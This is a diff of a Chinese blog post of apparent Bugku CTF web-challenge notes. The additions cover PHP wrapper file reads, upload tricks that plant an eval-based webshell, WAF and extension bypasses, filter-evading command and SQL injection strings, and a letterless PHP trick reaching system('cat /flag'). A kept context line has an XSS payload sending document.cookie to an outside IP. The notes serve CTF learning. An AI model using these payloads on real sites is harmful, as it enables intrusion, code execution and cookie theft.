@@ -31,17 +31,22 @@
 <meta property="og:site_name" content="Kizureina&#39;s Blog">
 <meta property="og:description" content="Intro看来考研是凶多吉少了，虽然很痛苦，但也没办法。 一念之间，就错了这么多莫名其妙的简单题目，真吐血了。 时间是没办法停止的，只能继续往下走了。 Bugku各种Web思路 GitHack：把&#x2F;.git用wget -r递归下载下来，再在本地用git show和git reflog查看提交日志  Burp抓包看不同发包返回的变化  直接找请求头多余的参数  PHP超全局变量，$GLOB">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20241229173330562.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20241229173506776.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241225170359911.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241225175732215.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241226151241473.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241226151329447.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241226153011293.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20241227181622186.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20241229164635147.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20241229161919687.png">
 <meta property="article:published_time" content="2024-12-24T13:01:07.000Z">
-<meta property="article:modified_time" content="2024-12-27T07:55:08.723Z">
+<meta property="article:modified_time" content="2024-12-29T09:50:15.750Z">
 <meta property="article:author" content="Kizurena">
 <meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kizureina.github.io/images/image-20241225170359911.png">
+<meta name="twitter:image" content="https://kizureina.github.io/images/image-20241229173330562.png">
   
     <link rel="alternate" href="/atom.xml" title="Kizureina's Blog" type="application/atom+xml">
   
@@ -405,7 +410,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            6k 词 
+            7.4k 词 
           </div>
         </div>
         
@@ -446,6 +451,30 @@
 <li><p>此时可以用“;”、“|”等符号截断执行命令，但上述代码中没有命令执行的<strong>回显</strong></p>
 </li>
 <li><p>但可以使用<code>cat * &gt; test.txt</code>，将执行结果<strong>重定向到文本文件</strong>，再直接访问<code>url/test.txt</code>即可（一般静态网站均可以）</p>
+</li>
+</ul>
+</li>
+<li><p>文件包含——<strong>php伪协议</strong>读取文件：<code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+</li>
+<li><p>黑盒审计：注册用户后的<strong>头像上传功能</strong></p>
+</li>
+<li><p>文件上传被<strong>Base64编码</strong>，此时不能直接上传改后缀的一句话，而应该将<strong>一句话编码再改数据类型</strong></p>
+<ul>
+<li><p>上传图片的本质有两种：</p>
+<ol>
+<li>直接上传文件到服务器</li>
+<li>将二进制数据转为Base64的字符数据，再上传到服务器解析【&lt;-这种一般会在上传字符数据时指明**<code>MIME数据类型</code>**】</li>
+</ol>
+</li>
+<li><p>因此对第二种可以将一句话编码，再把mime类型改成<strong>image&#x2F;php</strong>后上传：</p>
+</li>
+<li><p><img src="/../images/image-20241229173330562.png" alt="image-20241229173330562"></p>
+</li>
+<li><p><img src="/../images/image-20241229173506776.png" alt="image-20241229173506776"></p>
+</li>
+<li><blockquote>
+<p>注意:要保持原本的格式，base64后的&#x2F;9j&#x2F;不可少，只是将jpg改为php</p>
+</blockquote>
 </li>
 </ul>
 </li>
@@ -491,10 +520,36 @@
 </li>
 <li><p>绕过PHP的**strcmp()**：</p>
 <ul>
-<li>&#96;&#96;&#96;php<br>  if (!strcmp($v3, $flag)) {<br>  echo $flag;<br>  }  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	- 此代码校验v3与flag是否相等，相等则echo</span><br><span class="line"></span><br><span class="line">	- 绕过用v3为数组即可：`v3[]=1111;`，`strcmp`无法比较数组。</span><br><span class="line"></span><br><span class="line">- **file_get_contents()**绕过：</span><br><span class="line"></span><br><span class="line">	- 使用`php://input`伪协议绕过</span><br><span class="line">		① 将要GET的参数?xxx=php://input【这个input伪协议会将请求体直接赋值给文件输出流】</span><br><span class="line">		② 用post方法传入想要`file_get_contents()`函数返回的值</span><br><span class="line">	- ![image-20241225214916290](../images/image-20241225214916290.png)</span><br><span class="line">	- 例如如上就是构造`file_get_contents($fn) == $ac`</span><br><span class="line">	- 用`data://`伪协议绕过</span><br><span class="line">		将url改为：?xxx=data://text/plain;base64,想要`file_get_contents()`函数返回的值的base64编码</span><br><span class="line">		或者将url改为：?xxx=data:text/plain,(url编码的内容)</span><br><span class="line">	</span><br><span class="line">- **过滤空格**时如何做命令执行：</span><br><span class="line"></span><br><span class="line">  - cat&amp;lt;flag.txt</span><br><span class="line">  - &#123;cat,flag.txt&#125;</span><br><span class="line">  - cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">- sql注入**过滤=**：</span><br><span class="line"></span><br><span class="line">  - id like 1</span><br><span class="line">  - id &lt;&gt; 1</span><br><span class="line">  - id in(1)</span><br><span class="line"></span><br><span class="line">- sql过滤**空格**：</span><br><span class="line"></span><br><span class="line">  - 用括号分割</span><br><span class="line">  - (union)(select)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 哈希碰撞</span><br><span class="line"></span><br><span class="line">#### 校验代码：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);</span><br><span class="line">/*</span><br><span class="line">通过 $_SERVER[&#x27;REQUEST_URI&#x27;] 获取当前请求的 URI（即网页的地址），然后使用 strstr 函数获取 URI 中从 ? 开始的部分。这个部分通常包含 URL 参数。例如，如果 URL 是 example.com/index.php?key=123, strstr 会返回 ?key=123。</span><br><span class="line">*/</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">/*</span><br><span class="line">substr($str, 1) 从 $str 的第二个字符开始截取字符串，去掉了前面的问号 ?。在上面的例子中，$str 会变成 key=123。</span><br><span class="line">*/</span><br><span class="line">$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">/*</span><br><span class="line">实现的关键</span><br><span class="line">parse_str 函数会解析 $str 中的查询字符串并将结果存入变量。假设 $str 为 =123，那么会将 key1 赋值为 123，并且如果存在其他类似的参数，会相应地解析并赋值。</span><br><span class="line">*/</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+<li>&#96;&#96;&#96;php<br>  if (!strcmp($v3, $flag)) {<br>  echo $flag;<br>  }  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	- 此代码校验v3与flag是否相等，相等则echo</span><br><span class="line"></span><br><span class="line">	- 绕过用v3为数组即可：`v3[]=1111;`，`strcmp`无法比较数组。</span><br><span class="line"></span><br><span class="line">- **file_get_contents()**绕过：</span><br><span class="line"></span><br><span class="line">	- 使用`php://input`伪协议绕过【注意：php5.5后废弃了】</span><br><span class="line">		</span><br><span class="line">		1. 将要GET的参数?xxx=php://input【这个input伪协议会将请求体直接赋值给文件输出流】</span><br><span class="line">		2. 用post方法传入想要`file_get_contents()`函数返回的值</span><br><span class="line">		</span><br><span class="line">	- ![image-20241225214916290](../images/image-20241225214916290.png)</span><br><span class="line">	</span><br><span class="line">	- 例如如上就是构造`file_get_contents($fn) == $ac`</span><br><span class="line">	</span><br><span class="line">	- 用`data://`伪协议绕过</span><br><span class="line">		将url改为：?xxx=data://text/plain;base64,想要`file_get_contents()`函数返回的值的base64编码</span><br><span class="line">		或者将url改为：?xxx=data:text/plain**`,`**(url编码的内容)</span><br><span class="line">		</span><br><span class="line">		- 例如`$a=data://text/plain,bugku is a nice plateform!`【注意：分割字符串的可以用逗号也可以引号，但**逗号更常用**】</span><br><span class="line">		</span><br><span class="line">		- ```php</span><br><span class="line">		  &lt;?php</span><br><span class="line">		  // 目标字符串</span><br><span class="line">		  $string = &quot;bugku is a nice platform!&quot;;</span><br><span class="line">		  </span><br><span class="line">		  // 将字符串进行 Base64 编码</span><br><span class="line">		  $encoded_string = base64_encode($string);</span><br><span class="line">		  </span><br><span class="line">		  // 使用 Base64 编码的 data URL 协议</span><br><span class="line">		  $data_url = &#x27;data:text/plain;base64,&#x27; . $encoded_string;</span><br><span class="line">		  </span><br><span class="line">		  // 使用 file_get_contents 获取字符串内容</span><br><span class="line">		  $result = file_get_contents($data_url);</span><br><span class="line">		  </span><br><span class="line">		  // 输出结果</span><br><span class="line">		  echo $result;</span><br><span class="line">		  ?&gt;</span><br></pre></td></tr></table></figure></li>
 </ul>
 </li>
+<li><p><strong>过滤空格</strong>时如何做命令执行：</p>
+<ul>
+<li>cat&lt;flag.txt</li>
+<li>{cat,flag.txt}</li>
+<li>cat&lt;&gt;flag.txt</li>
 </ul>
+</li>
+<li><p>sql注入**过滤&#x3D;**：</p>
+<ul>
+<li>id like 1</li>
+<li>id &lt;&gt; 1</li>
+<li>id in(1)</li>
+</ul>
+</li>
+<li><p>sql过滤<strong>空格</strong>：</p>
+<ul>
+<li>用括号分割</li>
+<li>(union)(select)</li>
+</ul>
+</li>
+<li><p>绕过WAF的**<code>Content-Type</code>**检测：HTTP头上方的content-type: multipart&#x2F;form-data 用大小写混淆改为大写M</p>
+</li>
+<li><p>后缀名检测.php，可以用**.php4**</p>
+</li>
+</ul>
+<h2 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h2><h4 id="校验代码："><a href="#校验代码：" class="headerlink" title="校验代码："></a>校验代码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">通过 $_SERVER[&#x27;REQUEST_URI&#x27;] 获取当前请求的 URI（即网页的地址），然后使用 strstr 函数获取 URI 中从 ? 开始的部分。这个部分通常包含 URL 参数。例如，如果 URL 是 example.com/index.php?key=123, strstr 会返回 ?key=123。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">substr($str, 1) 从 $str 的第二个字符开始截取字符串，去掉了前面的问号 ?。在上面的例子中，$str 会变成 key=123。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">实现的关键</span></span><br><span class="line"><span class="comment">parse_str 函数会解析 $str 中的查询字符串并将结果存入变量。假设 $str 为 =123，那么会将 key1 赋值为 123，并且如果存在其他类似的参数，会相应地解析并赋值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>注意需要<strong>绕过key的过滤</strong>，双写kekeyy：<code>http://114.67.175.224:10301/index.php?kekeyy1=s878926199a&amp;kekeyy2=s155964671a</code></p>
 <h4 id="具体md5绕过原理"><a href="#具体md5绕过原理" class="headerlink" title="具体md5绕过原理"></a>具体md5绕过原理</h4><blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br></pre></td></tr></table></figure>
@@ -703,6 +758,92 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scsCRiPtript src=<span class="string">&quot;http://104.238.183.19:8081?flagcookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&gt;&lt;/scsCRiPtript&gt;</span><br></pre></td></tr></table></figure>
 
 <p>双写+大小写绕过。注意上面的代码需要开个服务器socket接收http请求。</p>
+<h2 id="文件包含-文件上传"><a href="#文件包含-文件上传" class="headerlink" title="文件包含+文件上传"></a>文件包含+文件上传</h2><p>文件包含：多出现在有<code>ip:port/file=xxxx.php</code>的页面</p>
+<p>可以用伪协议读取上传文件功能的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=</span></span><br></pre></td></tr></table></figure>
+
+<p>但大多数时候会被屏蔽。</p>
+<h3 id="phar上传一句话"><a href="#phar上传一句话" class="headerlink" title="phar上传一句话"></a>phar上传一句话</h3><p>先写个一句话【&lt;?php被过滤时】：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]) &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后将<code>shell.php</code>打包为zip，接着将<code>shell.zip</code> 更改为 <code>shell.png</code>，就是修改后缀名为<code>png</code></p>
+<p>再用**<code>phar://图片路径/shell</code>**伪协议读取连接菜刀即可。</p>
+<blockquote>
+<p>注意：有时候解析不了</p>
+</blockquote>
+<h3 id="直接用Burp抓包修改上传内容（很常用）"><a href="#直接用Burp抓包修改上传内容（很常用）" class="headerlink" title="直接用Burp抓包修改上传内容（很常用）"></a>直接用Burp抓包修改上传内容（很常用）</h3><p>不选择文件【也无需准备文件】，直接点上传再抓包，再做如下修改：</p>
+<p><img src="/../images/image-20241227181622186.png" alt="image-20241227181622186"></p>
+<p>添加图片名和Content-Type，再空一行写文件内容。</p>
+<blockquote>
+<p>注意：当&lt;?php&gt;被过滤可以用上面的写法</p>
+</blockquote>
+<p>再访问文件包含上传到的路径即可看到<strong>a</strong>显示在页面，说明解析成功。</p>
+<p>再用蚁剑连接即可。</p>
+<h4 id="后端为flask时"><a href="#后端为flask时" class="headerlink" title="后端为flask时"></a>后端为flask时</h4><p><img src="/../images/image-20241229164635147.png" alt="image-20241229164635147"></p>
+<h2 id="正则表达式-1"><a href="#正则表达式-1" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><strong>关于两重转义</strong><br>在正则表达式中要匹配一个反斜杠时，例如”\\“,前后两个反斜杠在PHP字符串中分别<strong>变成一个反斜杠</strong>；解释为两个反斜杠，再交由正则表达式解释为一个反斜杠，需要四个反斜杠。</p>
+<p><strong>PHP字符串 —-&gt; 正则表达式字符串参数 —–&gt; 正则解析转移后的pattern</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP字符串:<span class="string">&quot;\\.&quot;</span> ----&gt; 正则表达式形式:<span class="string">&quot;\.&quot;</span> ---&gt; 正则引擎解析结果<span class="string">&quot;\.&quot;</span>(转义的.)  </span><br><span class="line"></span><br><span class="line">PHP字符串:<span class="string">&quot;(\\)(\\)&quot;</span> ----&gt; 正则表达式形式:<span class="string">&quot;\\&quot;</span> ---&gt; 正则引擎解析结果<span class="string">&quot;\&quot;(普通符号\)  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PHP字符串:&quot;</span>(\\)(\\)|.php<span class="string">&quot; ----&gt; 正则表达式形式:&quot;</span>\\|.php<span class="string">&quot; ---&gt; 正则引擎解析结果pattern为&quot;</span>\<span class="string">&quot;或&quot;</span>.php<span class="string">&quot;(普通符号\)  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PHP字符串:&quot;</span>(\\)|.php<span class="string">&quot; ----&gt; 正则表达式形式:&quot;</span>\|.php<span class="string">&quot; ---&gt; 正则引擎解析结果&quot;</span>|.php<span class="string">&quot;(普通符号\)  </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>);</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<h4 id="正则表达式中的转义"><a href="#正则表达式中的转义" class="headerlink" title="正则表达式中的转义"></a><strong>正则表达式中的转义</strong></h4><p>在正则表达式中，竖线 <code>|</code> 是一个特殊字符，表示 “或” 的操作符。如果要匹配字面上的竖线 <code>|</code>，需要在正则表达式中转义它，写作 <code>\|</code>。</p>
+<h4 id="PHP-字符串中的转义"><a href="#PHP-字符串中的转义" class="headerlink" title="PHP 字符串中的转义"></a><strong>PHP 字符串中的转义</strong></h4><p>在 PHP 中，当正则表达式被作为字符串传递给函数（例如 <code>preg_match</code>），字符串本身也<strong>需要符合 PHP 的转义规则</strong>。PHP 使用反斜杠 <code>\</code> 作为转义字符，因此：</p>
+<ul>
+<li>在 PHP 字符串中，单个反斜杠 <code>\</code> 必须写作 <code>\\</code>。</li>
+</ul>
+<p>因此，正则表达式中的 <code>\|</code> 必须在 PHP 字符串中写作 <code>\\|</code>。</p>
+<blockquote>
+<p>即，若只要一个转义斜杠，PHP会将没有斜杠的内容传给正则表达式引擎，就少了一个斜杠</p>
+</blockquote>
+<h4 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a><strong>解析过程</strong></h4><ul>
+<li><code>/\\|</code> 在 PHP 中表示正则表达式中的 <code>\|</code>。</li>
+<li><code>\|</code> 在正则表达式中表示匹配字面上的竖线 <code>|</code>。</li>
+</ul>
+<h4 id="完整正则表达式分析"><a href="#完整正则表达式分析" class="headerlink" title="完整正则表达式分析"></a><strong>完整正则表达式分析</strong></h4><p><code>/\\|\056\160\150\x70/i</code> 可以拆解为以下部分：</p>
+<ul>
+<li><code>\\|</code>: 匹配反斜杠 <code>\</code> 或竖线 <code>|</code>。</li>
+<li><code>\056</code>: 匹配点 <code>.</code>。【八进制ASCII】</li>
+<li><code>\160</code>: 匹配字母 <code>p</code>。【八进制ASCII】</li>
+<li><code>\150</code>: 匹配字母 <code>h</code>。【八进制ASCII】</li>
+<li><code>\x70</code>: 匹配字母 <code>p</code>。【<strong>十六</strong>进制ASCII】</li>
+</ul>
+<p>整个正则表达式匹配：</p>
+<ul>
+<li>**<code>\|</code>**（反斜杠或竖线），后接 **<code>.php</code>**（点加 <code>php</code>）。</li>
+</ul>
+<h3 id="查找未被正则表达式过滤的字符（通用）"><a href="#查找未被正则表达式过滤的字符（通用）" class="headerlink" title="查找未被正则表达式过滤的字符（通用）"></a>查找未被正则表达式过滤的字符（通用）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">32</span>; <span class="variable">$i</span> &lt; <span class="number">127</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>); <span class="comment">// 将当前的 ASCII 值转换为字符</span></span><br><span class="line">    <span class="comment">// 检查该字符是否未被正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="variable">$char</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$char</span> . <span class="string">&quot; &quot;</span>; <span class="comment">// 输出未匹配的字符</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP动态变量绕过正则表达式【离谱操作】"><a href="#PHP动态变量绕过正则表达式【离谱操作】" class="headerlink" title="PHP动态变量绕过正则表达式【离谱操作】"></a>PHP动态变量绕过正则表达式【离谱操作】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[_];</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment"># 输出_POST</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当过滤所有字母数字时，可以通过NaN和null(即0)强行造出“<strong>N</strong>”，再用字符串自增构造需要的字符：</p>
+</blockquote>
+<h4 id="1"><a href="#1" class="headerlink" title="1. $_=(_/_._)[_];"></a>1. <code>$_=(_/_._)[_];</code></h4><ul>
+<li><code>_</code> 是一个变量名，它的值没有明确赋值。</li>
+<li>表达式 <code>(_/_._)</code> 是 PHP 的计算：<ul>
+<li><code>_</code> 未初始化，但 PHP 会将其当作 <code>null</code>，在数值上下文中，<code>null</code> 等价于 <code>0</code>。</li>
+<li>因此，<code>0 / 0.0</code> 触发一个 <strong>除以零的警告</strong>，但结果是 <code>NaN</code>（Not a Number）【实际是一个字符串数组】。</li>
+</ul>
+</li>
+<li><code>(NaN)[_]</code> 是数组访问第一个字符【即[0]】。</li>
+<li>即ASCII字符“<strong>N</strong>”.</li>
+</ul>
+<hr>
+<h4 id="2"><a href="#2" class="headerlink" title="2. $_++;"></a>2. <code>$_++;</code></h4><ul>
+<li>自增操作对字符串 <code>&quot;N&quot;</code> 作用：<ul>
+<li>PHP 的字符串自增是按 ASCII 顺序递增的。</li>
+<li><code>&quot;N&quot;</code> 自增后变为 <code>&quot;O&quot;</code>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="进阶：动态函数构造RCE"><a href="#进阶：动态函数构造RCE" class="headerlink" title="进阶：动态函数构造RCE"></a>进阶：动态函数构造RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);</span><br><span class="line"><span class="comment">#也就是 $_POST[_]($_POST[__])</span></span><br></pre></td></tr></table></figure>
+
+<p>_和__是两个变量</p>
+<p>当传入为<code>_=system&amp;__=cat /flag</code>，可拼接为动态函数调用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20241229161919687.png" alt="image-20241229161919687"></p>
 
         
       </div>
